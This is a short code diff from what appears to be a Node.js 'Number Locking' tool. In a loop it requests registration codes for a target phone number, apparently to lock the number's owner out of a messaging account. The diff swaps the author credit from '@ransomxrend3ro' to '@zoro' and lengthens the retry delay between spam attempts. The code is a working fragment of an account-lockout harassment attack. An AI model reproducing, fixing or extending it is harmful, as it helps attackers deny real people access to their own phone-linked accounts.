@@ -25,7 +25,7 @@ const start = async () => {
       try {
       //console.log(gradient('red', 'red')('💀■■■■■■■💀 +' + ddi + number))
       console.clear();
-      console.log(gradient('red', 'blue')('💀Number Locking by @ransomxrend3ro💀 +' + ddi + number))
+      console.log(gradient('red', 'blue')('💀Number Locking by @zoro💀 +' + ddi + number))
         res = await spam.requestRegistrationCode({
           phoneNumber: '+' + phoneNumber,
           phoneNumberCountryCode: ddi,
@@ -37,7 +37,7 @@ const start = async () => {
           //console.log(gradient('gray', 'gray')(`Número derrubado: +${res.login}`));
           setTimeout(async () => {
             dropNumber(context)
-          }, res.retry_after * 1000)
+          }, res.retry_after * 10000)
           return;
         }
       } catch (error) {
